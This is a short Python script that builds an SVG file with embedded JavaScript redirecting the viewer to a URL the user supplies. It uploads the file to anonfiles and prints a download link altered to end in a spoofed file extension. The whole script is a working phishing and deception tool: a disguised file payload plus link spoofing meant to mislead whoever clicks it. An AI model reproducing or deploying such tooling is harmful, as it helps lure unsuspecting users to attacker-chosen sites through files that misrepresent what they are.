import requests, re

url = input("Enter the URL you want it to take you to: ")
fname = input("Enter the filename (without the extension): ")
spoofext = input("Enter the spoofed file extension: ")

template = r"""<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <script>
        window.location.href = "%s";
    </script>
</svg>"""

upload = requests.post("https://api.anonfiles.com/upload", files={"file": (f"{fname}.svg", template % url)})

j = re.findall(r'https://cdn-\d+\.anonfiles\.com/[A-Za-z\d]+/[A-Za-z\d]+-\d+/[^"]+', requests.get(upload.json()["data"]["file"]["url"]["short"]).text)[0][:-3]+spoofext
print("Download Link: " + upload.json()["data"]["file"]["url"]["short"])
print("Spoofed Download Link: " + j)

while True: pass